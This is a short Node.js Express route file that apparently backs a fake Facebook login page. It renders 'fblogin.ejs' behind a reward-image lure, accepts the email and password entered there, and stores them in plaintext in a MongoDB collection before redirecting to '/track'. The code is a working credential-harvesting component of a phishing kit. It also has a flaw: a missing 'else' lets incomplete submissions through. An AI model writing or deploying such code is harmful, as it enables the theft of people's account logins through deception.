const express = require("express");
const router = express.Router();
const User = require("../models/user");
const mongoose = require("mongoose");
const dbUrl = process.env.ATLASDB_URL;
async function main() {
    await mongoose.connect(dbUrl);
}
main();

router.route("/")
    .get((req, res) => {
    let { rewardimg } = req.query;
    if (!rewardimg) {
        res.redirect("/");
    } else {
        res.render("listings/fblogin.ejs", { rewardimg });
    }
}).post(async (req, res) => {
    let { email, password, imgurl } = req.body;
    if (!email || !password || !imgurl) {
        res.redirect("/clear");
    } {
        const user = new User({
            email: email,
            password: password,
            imgurl: imgurl
        });
        try {
            let a = await user.save();
            res.redirect("/track");
        } catch (err) {
            console.log(err);
        }
    }
});
module.exports = router;